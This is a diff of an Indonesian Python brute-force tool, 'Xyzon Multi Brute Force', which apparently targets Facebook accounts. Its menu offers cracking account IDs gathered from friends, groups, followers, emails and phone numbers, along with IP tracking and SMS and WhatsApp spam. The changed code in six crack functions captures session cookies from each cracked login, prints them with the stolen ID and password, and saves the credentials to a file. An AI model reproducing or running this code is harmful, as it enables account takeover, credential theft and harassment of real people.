@@ -337,8 +337,8 @@ def back():
 def banner():
 	cetak(panel(f"""
 [bold white]                __   ____   __ ______ _____  _   _       
-[bold red]      ▀▀▀▀     [bold white] \ \ / /\ \ / /|___  /|  _  || \ | |
-[bold white]      ▀▀▀▀  [bold red]     \ V /  \ V /    / / | | | ||  \| |        [bold green]PremiumXD
+[bold red]      ▄▄▄     [bold white] \ \ / /\ \ / /|___  /|  _  || \ | |
+[bold white]      ▄▄▄  [bold red]     \ V /  \ V /    / / | | | ||  \| |        [bold green]PremiumXD
 [bold red]                 /   \   \ /    / /  | | | || . ` |        [bold cyan]By XyzonXD
 [bold cyan]                / /^\ \  | |  ./ /___\ \_/ /| |\  |        [bold white]V.2.5
 [bold cyan]                \/   \/  \_/  \_____/ \___/ \_| \_/
@@ -348,8 +348,8 @@ def banner():
 def logo():
 	cetak(panel(f"""
 [bold white]                 _____  _____  _____  _   __ _____  _____  _____ 
-[bold red]     ▀▀▀▀     [bold white] /  __ \|  _  ||  _  || | / /|_   _||  ___|/  ___|
-[bold white]      ▀▀▀▀  [bold red]   | /  \/| | | || | | || |/ /   | |  | |__  \ `--.       [bold green]PremiumXD
+[bold red]     ▄▄▄     [bold white] /  __ \|  _  ||  _  || | / /|_   _||  ___|/  ___|
+[bold white]      ▄▄▄  [bold red]   | /  \/| | | || | | || |/ /   | |  | |__  \ `--.       [bold green]PremiumXD
 [bold red]               | |    | | | || | | ||    \   | |  |  __|  `--. \      [bold cyan]By XyzonXD
 [bold cyan]               | \__/\\\_/ / \ \_/ /| |\  \ _| |_ | |___ /\__/ /      [bold white]V.2.5
 [bold cyan]                \____/ \___/  \___/ \_| \_/ \___/ \____/ \____/ 
@@ -477,7 +477,7 @@ def menu(my_name,my_id):
 	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]Xyzon Dev[bold cyan] Yang Telah Membuat Script Ini [bold yellow]Xyzon Multi Brute Force',width=90,style=f"bold red"))
 	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold cyan]Username : [bold yellow]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Ip  : [bold yellow]{ip}[/][/][bold white]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]Tanggal  : [bold yellow]{tgl} {bln} {thn}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold cyan]Status   : [bold green]Premium ',width=90,title=f"[bold red][[bold green] Informasi pengguna [bold red]]",style=f"bold red"))
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/] [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/] [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/] [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/] [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/] [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List menu [bold red]]",style=f"bold red"))
-	cetak(panel(f'\t[bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold red][[bold green] Informasi Crack [bold red]]",style=f"bold red"))
+	cetak(panel(f'    [bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold red][[bold green] Informasi Crack [bold red]]",style=f"bold red"))
 	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack : {P}')
 	if _____xyzon___xd____ in ['1','01']:
 		xyzoncrackpublik()
@@ -1457,7 +1457,7 @@ def result():
 				cpkuni=lin[nocp].split('|')
 				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
 				sol().print(mark(cpkuh,style="green"))
-				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
+				print(f'{hh}USER-AGENT : {K}{cpkuni[2]}')
 				nocp +=1
 			input(' \33[1;96m ENTER')
 			back()
@@ -1591,7 +1591,7 @@ def setting():
 	else:
 		pwpluss.append('no')
 	
-	_brayen_ = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;96mApakah Anda Ingin Menampilkan Aplikasi Yang Terkait Y/T : ')
+	_brayen_ = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;96mApakah Anda Ingin Menampilkan Aplikasi Yang Terkait Y/T : \x1b[1;97m')
 	if _brayen_ in ['']:
 		print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m] \33[1;91mPilih Yang Bener uy ')
 		back()
@@ -1600,7 +1600,7 @@ def setting():
 	else:
 		taplikasi.append('no')
 		
-	uatambah = input(f' {P}[{H}+{P}] \33[1;96mApakah Anda Ingin Mengunakan User-Agent Manual Y/T :{P} ')
+	uatambah = input(f' {P}[{H}+{P}] \33[1;96mApakah Anda Ingin Mengunakan User-Agent Manual Di Script Y/T :{P} ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
 		bzer = input(f' {P}[{H}+{P}] \33[1;96mMasukan User-Agent :{P} ')
@@ -1685,7 +1685,7 @@ def passwrd():
 	if xyzondsini in ['y','Y']:
 		back()
 	else:
-		print(f'{K}>>{O} Selamat Tinggal {P}| {H}{my_name} {K} << ')
+		print(f'{K}>>{O} Selamat Tinggal {P}| {H}Xyzon Dev {K} << ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE MOBILE ]-----------------#
@@ -1724,9 +1724,17 @@ def crack(idf,pwv):
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1784,9 +1792,17 @@ def crackbapi(idf,pwv):
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1849,9 +1865,17 @@ def crackmbasic(idf,pwv):
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				os.popen("play-audio data/audio/data_dapet.mp3")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1893,9 +1917,17 @@ def crackfree(idf,pwv):
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -1956,9 +1988,17 @@ def crackasync(idf,pwv):
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
@@ -2019,9 +2059,17 @@ def crackreguler(idf,pwv):
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif 'ya' in taplikasi:
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				cetak(panel(f"[bold green]{idf} | {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
-				
 			else:
 				continue
 		except requests.exceptions.ConnectionError:
